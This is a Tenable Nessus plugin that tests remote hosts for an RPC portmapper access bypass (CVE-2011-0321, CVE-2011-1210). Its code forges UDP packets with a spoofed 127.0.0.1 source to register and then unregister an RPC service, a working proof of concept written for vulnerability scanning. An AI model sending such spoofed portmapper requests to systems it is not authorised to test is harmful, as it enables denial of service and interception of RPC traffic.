#TRUSTED 5640de1ff9bbfa819859b335cce1590d2d23c7146ad5e671a0034c2d34cf0a4ad9aaa842fb3857c5af54bf9e4abdee9fc1ec24b8ce0c1856851000cbd5c285b4fe06435fa21a087f38ed7cacc8d4aa02878e8599404b76c811175ec5ae39d4479b8b1654564eeadc1e0c0c816a179a4956111d8fd788363183a6e14a736ecfe2219c6fb70841a7d64528ab461f43cdea82f739622055a37064c68e65cd360760b496b1b833c30fd593cd84045e94d0cb7aab7dc6d553da1f4b1542374afe13511134e9191c526819cd19818c01a32f408d49671bd3aa52f714ded98754979c40c0e4e2063ac22db83b34e0688d24c9829dc1321cc288f595d53bcaa4781e91e642d0e81e58678206d3afd4b7cd944616703decafcee31cf266fab6258029bc480a018069dc4b8b1b7616d1145608df0c0f818a856e28eaeb39b00ef1e1d19fff76c8af2b1a024e4a73699a74cd7444b8c8ef2edbc03d895ee9e516816e905cdd1ea286b33833d7fa8b0af384b0a3b18a2583c2fda062d91c2675c4dd338de0aa6ee8618b293860a5415f6617ba25baaa788be521aa792a25e11e01b6f881b5ec5d8d4eb0c0ab5fb81dce5c82e2178ca52fcae3266e9da75281684f10ffa73d840990e08c59ebb04bcfd29d5b3468e359a50f1353424a98a1b82163f0d08c452a83a9f18ad720597e4ec6dcaf21ec99f042acc8c14d200ceff23a25d4cf9ff1b5
#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(54586);
  script_version("1.5");
  script_set_attribute(attribute:"plugin_modification_date", value:"2014/02/18");

  script_cve_id("CVE-2011-0321", "CVE-2011-1210");
  script_bugtraq_id(46044, 47875);
  script_osvdb_id(70686, 72701);

  script_name(english:"Multiple Vendor RPC portmapper Access Restriction Bypass");
  script_summary(english:"Tries to register/unregister an RPC service");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The RPC portmapper on the remote host has an access restriction bypass
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The RPC portmapper running on the remote host (possibly included with
EMC Legato Networker, IBM Informix Dynamic Server, or AIX) has an
access restriction bypass vulnerability.

The service will only process pmap_set and pmap_unset requests that
have a source address of '127.0.0.1'.  Since communication is
performed via UDP, the source address can be spoofed, effectively
bypassing the verification process.  This allows remote,
unauthenticated attackers to register and unregister arbitrary RPC
services.

A remote attacker could exploit this to cause a denial of service or
eavesdrop on process communications."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.zerodayinitiative.com/advisories/ZDI-11-168/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?d2273224"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76179"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76177"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76178"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://aix.software.ibm.com/aix/efixes/security/rpc_advisory.asc"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Apply the relevant patch from the referenced documents for EMC Legato
Networker, IBM Informix Dynamic Server, or AIX.  If a different
application is being used, contact the vendor for a fix."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:informix");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:emc:legato_networker");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"RPC");

  script_copyright(english:"This script is Copyright (C) 2011-2014 Tenable Network Security, Inc.");

  script_dependencies("rpc_portmap.nasl", "rpcinfo.nasl");
  script_require_keys("Services/udp/rpc-portmapper");

  exit(0);
}


global_var debug_level;

include("global_settings.inc");
include("misc_func.inc");
include("raw.inc");
include("sunrpc_func.inc");


PMAP_SET = 1;
PMAP_UNSET = 2;

# UDP port the portmapper is listening on
global_var portmap;

# info for the service we'll try to register
global_var port, prognum, versnum, proto;

##
# sends a pmap_set or pmap_unset (depending on 'proc')
# using a spoofed source address (localhost)
#
# exits if invalid argument provided to 'proc'
#
# @anonparam  proc  procedure (1 for set or 2 for unset)
##
function pmap_request()
{
  local_var proc, pmap_data, rpc_data, ip, udp, packet;
  proc = _FCT_ANON_ARGS[0];
  if (proc != PMAP_SET && proc != PMAP_UNSET)
    exit(1, "Unexpected procedure: " + proc);

  # this is the same for pmap_set and pmap_unset. pmap_unset ignores
  # the last two arguments, but they appear to be required anyway
  pmap_data =
    mkdword(prognum) +
    mkdword(versnum) +
    mkdword(proto) +
    mkdword(port);

  ip = ip(ip_dst:get_host_ip(), ip_src:'127.0.0.1', ip_p:IPPROTO_UDP);
  udp = udp(uh_dport:portmap, uh_sport:1000);
  rpc_data = rpc_packet(prog:100000, vers:2, proc:proc, data:pmap_data);
  packet = link_layer() + mkpacket(ip, udp, payload(rpc_data));
  inject_packet(packet:packet);
}

# plugin starts here

# make sure the PoC is only run once, in case there are
# multiple portmap services listening on the same host
portmappers = get_kb_list('Services/udp/rpc-portmapper');
if (isnull(portmappers)) exit(1, "The 'Services/udp/rpc-portmapper' KB item is missing.");
portmappers = sort(make_list(portmappers));
portmap = portmappers[0];

port = 12345;
prognum = 847883;  # 400111-200099999 = unassigned
versnum = 2;
proto = 6;  #TCP

# make sure to get TCP and UDP services
rpc_svcs = get_kb_list('Services*/rpc-*');

# make sure the program number of the service we'll attempt to register
# is not already registered
if (rpc_svcs)
{
  foreach key (keys(rpc_svcs))
  {
    match = eregmatch(string:key, pattern:'/rpc-(.+)$');
    if (isnull(match))  # this should always match unless something's horribly wrong
      exit(1, 'Unexpected error parsing "' + key + '".');
    else if (match[1] == prognum)
      exit(1, 'Program number '+prognum+' is already registered.');
  }
}

# first, try to register a new service
pmap_request(PMAP_SET);

# see if it was registered
res = get_rpc_port2(program:prognum, protocol:proto, portmap:portmap);

# then attempt to unregister it
pmap_request(PMAP_UNSET);

if (res == port)
  security_warning(port:portmap, proto:'udp');
else
  exit(1, 'Unable to determine if the service on UDP '+portmap+' is vulnerable.');

